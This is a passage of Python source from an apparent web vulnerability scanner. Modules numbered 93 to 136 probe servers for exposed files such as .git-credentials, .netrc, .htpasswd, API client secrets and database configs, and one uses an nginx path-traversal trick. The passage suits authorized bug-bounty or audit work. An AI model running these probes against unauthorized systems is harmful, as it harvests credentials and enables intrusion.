  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# dockerfile-hidden-disclosure
def attMOD93(progScope):
  myKey = "69775515dca5365c23a8c90f21a32879"
  vulnCat = "Exposure"
  vulnName = "Expo93"
  severity = "P3"
  vulnDsc = "Dockerfile Hidden Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.dockerfile','/.Dockerfile']
  redirAllow = False
  statusF = 200
  textF = 'WORKDIR'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'EXPOSE' in z.text and 'ENV' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# esmtprc-config
def attMOD94(progScope):
  myKey = "7089075160dce2789be8c16ffe70d68d"
  vulnCat = "Exposure"
  vulnName = "Expo94"
  severity = "esmtprc-config"
  vulnDsc = "eSMTP config disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.esmtprc']
  redirAllow = False
  statusF = 200
  textF = '<clientConfig'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<authentication>' in z.text and '<hostname>' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-authentication.asmx
def attMOD95(progScope):
  myKey = "e796013e55d3d36760f1e1c9d1702f85"
  vulnCat = "Exposure"
  vulnName = "Expo95"
  severity = "P4"
  vulnDsc = "Exposed Authentication.asmx"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_vti_bin/Authentication.asmx?op=Mode']
  redirAllow = False
  statusF = 200
  textF = 'Authentication Web Service'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-bitkeeper
def attMOD96(progScope):
  myKey = "57c81baf15778db57885338abbd3c585"
  vulnCat = "Exposure"
  vulnName = "Expo96"
  severity = "P4"
  vulnDsc = "Exposed BitKeeper Directory"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/BitKeeper/etc/config']
  redirAllow = False
  statusF = 200
  textF = 'BitKeeper configuration'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-bzr
def attMOD97(progScope):
  myKey = "1ee6c16096433f7df97d15097c38e291"
  vulnCat = "Exposure"
  vulnName = "Expo97"
  severity = "P4"
  vulnDsc = "Exposed BZR Directory"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.bzr/branch/branch.conf']
  redirAllow = False
  statusF = 200
  textF = 'parent_location'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-darcs
def attMOD98(progScope):
  myKey = "6f0b2904f508976399f58d15d66fc9d2"
  vulnCat = "Exposure"
  vulnName = "Expo98"
  severity = "P4"
  vulnDsc = "Exposed Darcs Config"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_darcs/prefs/binaries']
  redirAllow = False
  statusF = 200
  textF = 'Binary file regexps'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-gitignore
def attMOD99(progScope):
  myKey = "b3394d589f055618b89fab7284dc041d"
  vulnCat = "Exposure"
  vulnName = "Expo99"
  severity = "P4"
  vulnDsc = "Exposed Gitignore"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.gitignore','/assets/.gitignore','/includes/.gitignore']
  redirAllow = False
  statusF = 200
  textF = '# custom files'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-hg
def attMOD100(progScope):
  myKey = "831523ca1e900ce0b228c829b8f76a9a"
  vulnCat = "Exposure"
  vulnName = "Expo100"
  severity = "P4"
  vulnDsc = "Exposed HG Directory"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.hg/hgrc']
  redirAllow = False
  statusF = 200
  textF = '[paths]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-sharepoint-list
def attMOD101(progScope):
  myKey = "7241f2499f822e29755b4e0779f8d240"
  vulnCat = "Exposure"
  vulnName = "Expo101"
  severity = "P4"
  vulnDsc = "Exposed sharepoint list"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_vti_bin/lists.asmx?WSDL']
  redirAllow = False
  statusF = 200
  textF = 'GetListResponse'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'GetList' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-svn 
def attMOD102(progScope):
  myKey = "67c63a513606aca9d09a0d636a0f7127"
  vulnCat = "Exposure"
  vulnName = "Expo102"
  severity = "P3"
  vulnDsc = "Exposed SVN Directory"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.svn/entries']
  redirAllow = False
  statusF = 200
  textF = 'svn:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'svn-base' in z.text and 'has-props' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-vscode
def attMOD103(progScope):
  myKey = "1c854c1e50820df710f0d06ca97883e8"
  vulnCat = "Exposure"
  vulnName = "Expo103"
  severity = "P4"
  vulnDsc = "Exposed VSCode Folders"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.vscode/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /.vscode'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# firebase-config-exposure
def attMOD104(progScope):
  myKey = "b2e3656b3ef28edd80f54b944cfecfbc"
  vulnCat = "Exposure"
  vulnName = "Expo104"
  severity = "P2"
  vulnDsc = "Firebase Config Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/public/config.js','/config.js']
  redirAllow = False
  statusF = 200
  textF = 'apiKey:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'authDomain:' in z.text and 'databaseURL:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ftp-credentials-exposure
def attMOD105(progScope):
  myKey = "cb7737eb4221e37ef4067df0fb4df0ec"
  vulnCat = "Exposure"
  vulnName = "Expo105"
  severity = "P3"
  vulnDsc = "FTP credentials exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ftpsync.settings']
  redirAllow = False
  statusF = 200
  textF = 'FTPSync'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'overwrite_newer_prevention' in z.text and 'default_folder_permissions' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# git-config-nginxoffbyslas
def attMOD106(progScope):
  myKey = "0d2e25f123f4b792ba8a54c9cf80738d"
  vulnCat = "Exposure"
  vulnName = "Expo106"
  severity = "P3"
  vulnDsc = "Nginx off-by-slash exposes Git config"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/static../.git/config','/js../.git/config','/images../.git/config','/img../.git/config','/css../.git/config','/assets../.git/config','/content../.git/config','/events../.git/config','/media../.git/config','/lib../.git/config']
  redirAllow = False
  statusF = 200
  textF = '[core]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# git-credentials-disclosure
def attMOD107(progScope):
  myKey = "99d09ce6bce303d6bf22ae415f445ad7"
  vulnCat = "Exposure"
  vulnName = "Expo107"
  severity = "P3"
  vulnDsc = "Git Credentials Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.git-credentials']
  redirAllow = False
  statusF = 200
  textF = 'https://'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '@github.com' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# github-workflows-disclosure
def attMOD108(progScope):
  myKey = "4fb2a97b11da6d80a73241640f9500ae"
  vulnCat = "Exposure"
  vulnName = "Expo108"
  severity = "P3"
  vulnDsc = "Github Workflow Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.github/workflows/main.yml','/.github/workflows/main.yaml']
  redirAllow = False
  statusF = 200
  textF = 'steps'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'jobs' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# gmail-api-client-secrets
def attMOD109(progScope):
  myKey = "d98b7c61a97217e56467299517ffafbb"
  vulnCat = "Exposure"
  vulnName = "Expo109"
  severity = "P4"
  vulnDsc = "GMail API client_secrets.json"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/client_secrets.json']
  redirAllow = False
  statusF = 200
  textF = 'auth_uri'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Exposed-metrics
def attMOD110(progScope):
  myKey = "3adcb98d4c816464126f925b83131034"
  vulnCat = "Exposure"
  vulnName = "Expo110"
  severity = "P4"
  vulnDsc = "Exposed metrics"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/metrics']
  redirAllow = False
  statusF = 200
  textF = 'cpu_seconds_total'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# 
def attMOD111(progScope):
  myKey = "1e77f1cb321c6664ff829c8593b49c46"
  vulnCat = "Exposure"
  vulnName = "Expo111"
  severity = "P4"
  vulnDsc = "Hikvision Info Leak"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/config/user.xml']
  redirAllow = False
  statusF = 200
  textF = 'password='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# hp-ilo-serial-key-disclosure
def attMOD112(progScope):
  myKey = "53f427394b76e81c9bb2449c53b3dd57"
  vulnCat = "Exposure"
  vulnName = "Expo112"
  severity = "P3"
  vulnDsc = "HP ILO Serial Key Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/xmldata?item=CpqKey']
  redirAllow = False
  statusF = 200
  textF = 'LTYPE'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'LNAME' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# htpasswd
def attMOD113(progScope):
  myKey = "63524c1c55b82c45ede86612a23b9491"
  vulnCat = "Exposure"
  vulnName = "Expo113"
  severity = "P4"
  vulnDsc = "Detect exposed .htpasswd files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.htpasswd']
  redirAllow = False
  statusF = 200
  textF = ':$2y$'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or ':$apr1$' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# httpd-config
def attMOD114(progScope):
  myKey = "19d8e8b9dd311a92929b6451c02fad86"
  vulnCat = "Exposure"
  vulnName = "Expo114"
  severity = "P4"
  vulnDsc = "Httpd Config file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/httpd.conf']
  redirAllow = False
  statusF = 200
  textF = 'LoadModule'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '# LoadModule' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# javascript-env
def attMOD115(progScope):
  myKey = "7d9d17763a4d84e90819c82f70b9b74e"
  vulnCat = "Exposure"
  vulnName = "Expo115"
  severity = "P4"
  vulnDsc = "JavaScript Environment Config"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/env.js','/env.development.js','/env.production.js','/env.test.js','/env.dev.js','/env.prod.js']
  redirAllow = False
  statusF = 200
  textF = 'PASSWORD'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'module.exports' in z.text and 'NODE_ENV' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# jetbrains-IDE-Datastore
def attMOD116(progScope):
  myKey = "7b0273c6fbff0a342026cb5e97a1c197"
  vulnCat = "Exposure"
  vulnName = "Expo116"
  severity = "P4"
  vulnDsc = "Jetbrains IDE DataSources exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.idea/dataSources.xml']
  redirAllow = False
  statusF = 200
  textF = 'DataSourceManagerImpl'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# joomla-config-dist-file
def attMOD117(progScope):
  myKey = "a3d26ac5781248196990de8b156fc5a8"
  vulnCat = "Exposure"
  vulnName = "Expo117"
  severity = "P4"
  vulnDsc = ""
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/configuration.php-dist']
  redirAllow = False
  statusF = 200
  textF = '$password'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'class jconfig {' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# keycloak-openid-config
def attMOD118(progScope):
  myKey = "95067e34933dd6d53ede81e60c798cb0"
  vulnCat = "Exposure"
  vulnName = "Expo118"
  severity = "P4"
  vulnDsc = "Keycloak openid-config"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.well-known/openid-configuration','/auth/realms/master/.well-known/openid-configuration']
  redirAllow = False
  statusF = 200
  textF = 'authorization_endpoint'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'issuer' in z.text and 'token_endpoint' in z.text and 'userinfo_endpoint' in z.text and 'jwks_uri' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# kubernetes-kustomization-disclosure
def attMOD119(progScope):
  myKey = "fcd0e6233d3d74e97b71d9b985b976cb"
  vulnCat = "Exposure"
  vulnName = "Expo119"
  severity = "P4"
  vulnDsc = "Kubernetes Kustomization Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/kustomization.yml']
  redirAllow = False
  statusF = 200
  textF = 'apiVersion'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'namespace:' in z.text and 'commonLabels:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# kyan-credential-exposure
def attMOD120(progScope):
  myKey = "1d803aae0092d9289aebe86e3b8b115d"
  vulnCat = "Exposure"
  vulnName = "Expo120"
  severity = "P4"
  vulnDsc = "Kyan network monitoring device account and password exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/hosts']
  redirAllow = False
  statusF = 200
  textF = 'Password='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'UserName=' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# lvmeng-uts-disclosure
def attMOD121(progScope):
  myKey = "1f70f22595152f115f3ad44e427e322b"
  vulnCat = "Exposure"
  vulnName = "Expo121"
  severity = "P4"
  vulnDsc = "Lvmeng UTS Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/webapi/v1/system/accountmanage/account']
  redirAllow = False
  statusF = 200
  textF = 'password'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'nsfocus_uts' in z.text and 'MANAGER_IP' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# magento-config
def attMOD122(progScope):
  myKey = "5542db465bfff852bc6e4e1cfc26824f"
  vulnCat = "Exposure"
  vulnName = "Expo122"
  severity = "P4"
  vulnDsc = "Magento Config Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/app/etc/local.xml','/store/app/etc/local.xml']
  redirAllow = False
  statusF = 200
  textF = 'Magento'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# nagios-status-page
def attMOD123(progScope):
  myKey = "22306ac99099a428f0c2c01cb6f45b62"
  vulnCat = "Exposure"
  vulnName = "Expo123"
  severity = "P4"
  vulnDsc = "Nagios Current Status Page"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/nagios/cgi-bin/status.cgi','/cgi-bin/nagios4/status.cgi','/cgi-bin/nagios3/status.cgi']
  redirAllow = False
  statusF = 200
  textF = 'Current Network Status'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# netrc
def attMOD124(progScope):
  myKey = "832fa6bf5284c0773e22654d127e1245"
  vulnCat = "Exposure"
  vulnName = "Expo124"
  severity = "P2"
  vulnDsc = "netrc config file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.netrc','/_netrc']
  redirAllow = False
  statusF = 200
  textF = 'login '
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'password ' in z.text and 'machine' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# opcache-status-exposure
def attMOD125(progScope):
  myKey = "b0bf49cac7ec817ce66a110e8405bdd5"
  vulnCat = "Exposure"
  vulnName = "Expo125"
  severity = "P4"
  vulnDsc = "OPcache Status Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/opcache-status/']
  redirAllow = False
  statusF = 200
  textF = '<th>opcache_enabled</th>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# oracle-ebs-credentials
def attMOD126(progScope):
  myKey = "d44bdb3fdbf3e08a0f4fdbb4b5dc331e"
  vulnCat = "Exposure"
  vulnName = "Expo126"
  severity = "P3"
  vulnDsc = "Oracle EBS Credentials Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/OA_HTML/jtfwrepo.xml']
  redirAllow = False
  statusF = 200
  textF = 'password='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<PUSR_LIST>' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# owncloud-config
def attMOD127(progScope):
  myKey = "ff95e948abd2da3d48b13c524c55e5d4"
  vulnCat = "Exposure"
  vulnName = "Expo127"
  severity = "P4"
  vulnDsc = "owncloud config Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/owncloud/config/']
  redirAllow = False
  statusF = 200
  textF = 'Index of'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'owncloud/config' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# package-json
def attMOD128(progScope):
  myKey = "66f90f3aebfdb56d81f8e77024efbea8"
  vulnCat = "Exposure"
  vulnName = "Expo128"
  severity = "P4"
  vulnDsc = "npm package.json disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/package.json','/package-lock.json']
  redirAllow = False
  statusF = 200
  textF = '"version" :'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '"name" : ' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# perl-status
def attMOD129(progScope):
  myKey = "8891e97829727a7a46b35fa8cd0e6b56"
  vulnCat = "Exposure"
  vulnName = "Expo129"
  severity = "P3"
  vulnDsc = "Apache mod_perl Status Page Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/perl-status']
  redirAllow = False
  statusF = 200
  textF = '<title>Apache2::Status'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Perl version' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# php-fpm-config
def attMOD130(progScope):
  myKey = "48614d0acf85486fa61fd95a0ccf843a"
  vulnCat = "Exposure"
  vulnName = "Expo130"
  severity = "P4"
  vulnDsc = "PHP-FPM Config file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/php-fpm.conf']
  redirAllow = False
  statusF = 200
  textF = 'FPM Configuration'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Pool Definitions' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# phpinfo-files
def attMOD131(progScope):
  myKey = "852d411ed80f43d04b1fc52c52111581"
  vulnCat = "Exposure"
  vulnName = "Expo131"
  severity = "P4"
  vulnDsc = "phpinfo Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/php.php','/phpinfo.php','/info.php','/infophp.php','/php_info.php','/test.php','/i.php','/asdf.php','/pinfo.php','/phpversion.php','/time.php','/index.php','/temp.php','/old_phpinfo.php','/infos.php','/linusadmin-phpinfo.php','/php-info.php','/dashboard/phpinfo.php']
  redirAllow = False
  statusF = 200
  textF = 'PHP Extension'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# plesk-stat
def attMOD132(progScope):
  myKey = "1cd1355b8d22e856e8afbe94a726fcf6"
  vulnCat = "Exposure"
  vulnName = "Expo132"
  severity = "P4"
  vulnDsc = "Plesk-stat (Log analyzer)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/plesk-stat/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /plesk-stat'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Parent Directory' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# proftpd-config
def attMOD133(progScope):
  myKey = "9e855fad12d7d904f0120a75fd5c0992"
  vulnCat = "Exposure"
  vulnName = "Expo133"
  severity = "P4"
  vulnDsc = "ProFTPD Config file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/proftpd.conf']
  redirAllow = False
  statusF = 200
  textF = 'ProFTPD'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'ServerName' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# prometheus-config-endpoint
def attMOD134(progScope):
  myKey = "df40a23cbf1b8a11019a54a6ae25a166"
  vulnCat = "Exposure"
  vulnName = "Expo134"
  severity = "P4"
  vulnDsc = "Prometheus config API endpoint"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/api/v1/status/config']
  redirAllow = False
  statusF = 200
  textF = 'job_name:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '{"status":"success","data":' in z.text and 'targets:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# qdpm-info-leak
def attMOD135(progScope):
  myKey = "b91387492a73ab5562e70b64b49c7b2d"
  vulnCat = "Exposure"
  vulnName = "Expo135"
  severity = "P2"
  vulnDsc = "The password and connection string for the database are stored in a yml file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/core/config/databases.yml']
  redirAllow = False
  statusF = 200
  textF = 'password:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'dsn:' in z.text and 'username:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# rails-database-config
def attMOD136(progScope):
  myKey = "43c5fab36f13f727ae183b96d867139a"
  vulnCat = "Exposure"
  vulnName = "Expo136"
